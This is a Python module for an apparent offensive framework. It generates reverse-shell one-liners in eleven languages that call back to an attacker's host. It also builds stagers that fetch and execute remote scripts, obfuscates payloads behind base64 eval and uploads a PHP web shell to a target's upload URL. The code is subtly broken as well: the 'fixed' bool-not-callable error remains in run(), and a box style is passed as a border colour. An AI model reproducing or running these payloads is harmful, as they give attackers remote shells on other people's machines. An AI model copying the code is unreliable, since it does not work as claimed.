# -*- coding: utf-8 -*-
"""
MEGA SUPER REVERSE SHELL v3.4 - FINAL STABLE
- All 11 languages
- Staged + Obfuscated
- Auto-upload
- Nano editor
- FIXED: 'bool' object is not callable
- FIXED: box conflict
"""

import os
import time
import random
import string
import base64
import urllib.parse
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.syntax import Syntax
from rich import box as rich_box  # ← FIXED: Rename import
from rich.prompt import Prompt

console = Console()

MODULE_INFO = {
    "name": "MEGA Reverse Shell v3.4",
    "author": "LazyMaster",
    "description": "11+ languages, staged, obfuscated, upload, nano editor [FINAL]",
    "platform": "Multi",
    "arch": "Multi",
    "rank": "Excellent",
    "dependencies": ["requests"],
    "references": ["https://github.com/swisskyrepo/PayloadsAllTheThings"]
}

OPTIONS = {
    "LHOST": {"description": "Listener IP", "required": True, "default": ""},
    "LPORT": {"description": "Listener port", "required": True, "default": "4444"},
    "TYPE": {
        "description": "Payload type",
        "required": True,
        "default": "all",
        "choices": ["bash", "nc", "perl", "python", "php", "ruby", "powershell", "java", "nodejs", "go", "csharp", "all"]
    },
    "STAGED": {"description": "Use staged payload", "required": False, "default": "yes", "choices": ["yes", "no"]},
    "OBFUSCATE": {"description": "Obfuscate payload", "required": False, "default": "yes", "choices": ["yes", "no"]},
    "UPLOAD_URL": {"description": "Web upload URL", "required": False, "default": ""},
    "UPLOAD_NAME": {"description": "Uploaded filename", "required": False, "default": "shell.php"},
    "ENCODE": {"description": "Final encoding", "required": False, "default": "none", "choices": ["none", "base64", "url"]}
}

SAVE_DIR = Path(__file__).parent.parent.parent / "saved_payloads"
SAVE_DIR.mkdir(exist_ok=True)

# === PAYLOADS ===
PAYLOADS = {
    "bash": 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    "nc": 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} {lport} >/tmp/f',
    "perl": """perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""",
    "python": """python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")'""",
    "php": """php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'""",
    "ruby": """ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{lhost}","{lport}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'""",
    "powershell": """powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$s.Write([Text.Encoding]::ASCII.GetBytes($sb2),0,$sb2.Length);$s.Flush()};$c.Close()" """,
    "java": """r = Runtime.getRuntime();p = r.exec(new String[]{"/bin/sh","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"});p.waitFor()""",
    "nodejs": """require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')""",
    "go": """package main;import("net");import("os/exec");func main(){c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}""",
    "csharp": """using System.Net.Sockets;class P{static void Main(){TcpClient c=new TcpClient("{lhost}",{lport});NetworkStream s=c.GetStream();System.IO.StreamReader r=new System.IO.StreamReader(s);System.IO.StreamWriter w=new System.IO.StreamWriter(s);w.AutoFlush=true;while(true)w.WriteLine(Console.ReadLine());}}"""
}

# === STAGERS ===
STAGERS = {
    "php": """<?php file_put_contents('s.php', file_get_contents('http://{lhost}:{lport}/s.php'));@include('s.php');?>""",
    "bash": """bash -c "curl -fsSL http://{lhost}:{lport}/s.sh -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s" """,
    "python": """python3 -c "import urllib.request,os;exec(urllib.request.urlopen('http://{lhost}:{lport}/s.py').read())" """,
    "powershell": """IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/s.ps1')""",
    "nodejs": """require('http').get('http://{lhost}:{lport}/s.js', r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})""",
}

# === OBFUSCATE ===
def obfuscate(payload, lang):
    if not payload: return payload
    if lang == "php":
        v = ''.join(random.choices(string.ascii_lowercase, k=6))
        return f"<?php ${v}='{base64.b64encode(payload.encode()).decode()}';@eval(base64_decode(${v}));?>"
    elif lang == "bash":
        return f"eval $(echo {base64.b64encode(payload.encode()).decode()} | base64 -d)"
    elif lang == "powershell":
        return ''.join(chr(ord(c)+1) if c.isalpha() else c for c in payload)
    elif lang == "nodejs":
        return ''.join(f"\\x{ord(c):02x}" if c in '()"\'' else c for c in payload)
    return payload

# === NANO EDITOR ===
def nano_editor(content, title="Payload"):
    if not content:
        content = "# No payload generated"
    lines = content.splitlines()
    cursor = 0
    while True:
        console.clear()
        console.print(f"[bold blue] GNU nano 7.0          {title}          [/bold blue][yellow]Ctrl+O Save  Ctrl+X Exit[/yellow]")
        console.print("[white]" + "─" * 78 + "[/white]")
        start = max(0, cursor - 10)
        visible = lines[start:start + 22]
        for i, line in enumerate(visible, start):
            marker = "[green]>[/green]" if i == cursor else "   "
            console.print(f"{marker} {i+1:3d} │ {line}")
        console.print("[white]" + "─" * 78 + "[/white]")
        console.print("[dim]↑↓ Navigate | Enter Edit | Ctrl+O Save | Ctrl+X Exit[/dim]")

        try:
            key = console.input()
        except:
            break

        if key == "\x1b[A" and cursor > 0: cursor -= 1
        elif key == "\x1b[B" and cursor < len(lines)-1: cursor += 1
        elif key == "\r" and cursor < len(lines):
            new = Prompt.ask(f"[cyan]Edit line {cursor+1}[/cyan]", default=lines[cursor])
            lines[cursor] = new
        elif key == "\x0f":  # Ctrl+O
            path = SAVE_DIR / f"{title.lower().replace(' ', '_')}.txt"
            path.write_text("\n".join(lines), encoding="utf-8")
            console.print(f"[green]Saved: {path}[/green]")
            time.sleep(1)
        elif key == "\x18":  # Ctrl+X
            break
    return "\n".join(lines)

# === UPLOAD ===
def upload_payload(content, url, filename):
    try:
        import requests
        files = {'file': (filename, content)}
        r = requests.post(url, files=files, timeout=10)
        return f"[green]Uploaded: {url}/{filename}[/green]" if r.status_code in [200, 201] else f"[red]Failed: {r.status_code}[/red]"
    except Exception as e:
        return f"[red]Upload error: {e}[/red]"

# === RUN - FINAL FIX ===
def run(session, options):
    # options = {"LHOST": "192.168.1.100", ...} ← string values
    lhost = options.get("LHOST", "")
    lport = options.get("LPORT", "")
    ptype = options.get("TYPE", "all").lower()
    staged = options.get("STAGED", "yes").lower() == "yes"
    obfuscate = options.get("OBFUSCATE", "yes").lower() == "yes"
    upload_url = options.get("UPLOAD_URL", "")
    upload_name = options.get("UPLOAD_NAME", "shell.php")
    encode = options.get("ENCODE", "none").lower()

    if not lhost or not lport:
        console.print("[red]LHOST and LPORT are required![/red]")
        return

    targets = list(PAYLOADS.keys()) if ptype == "all" else [ptype]
    results = {}

    for lang in targets:
        if lang not in PAYLOADS:
            continue
        raw = PAYLOADS[lang].format(lhost=lhost, lport=lport)

        if staged and lang in STAGERS:
            stager = STAGERS[lang].format(lhost=lhost, lport=lport)
            raw = f"{stager}\n\n# === STAGE 2 ===\n{raw}"

        if obfuscate:
            raw = obfuscate(raw, lang)

        if encode == "base64":
            raw = base64.b64encode(raw.encode()).decode()
        elif encode == "url":
            raw = urllib.parse.quote_plus(raw)

        results[lang] = raw

    # NANO EDITOR (gunakan rich_box)
    for lang, payload in results.items():
        title = f"{lang.upper()} REVERSE SHELL"
        console.print(f"\n[bold magenta]=== {title} ===[/bold magenta]")
        nano_editor(payload, title)

    # UPLOAD
    if upload_url and "php" in results:
        console.print(upload_payload(results["php"], upload_url, upload_name))

    # SAVE ALL
    all_payload = "\n\n".join([f"# {k.upper()}\n{v}" for k, v in results.items()])
    save_path = SAVE_DIR / f"mega_all_{lhost}_{lport}.txt"
    save_path.write_text(all_payload, encoding="utf-8")
    console.print(f"\n[bold green]All saved: {save_path}[/bold green]")

    # LISTENER (gunakan rich_box)
    console.print(Panel(
        f"[bold]nc -lvnp {lport}[/bold]\n"
        f"[bold]python3 -m http.server {lport}[/bold]  [dim]# staged[/dim]\n"
        f"[bold]rlwrap nc -lvnp {lport}[/bold]  [dim]# TTY[/dim]",
        title="Start Listener",
        border_style=rich_box.ROUNDED  # ← FIXED: gunakan rich_box
    ))
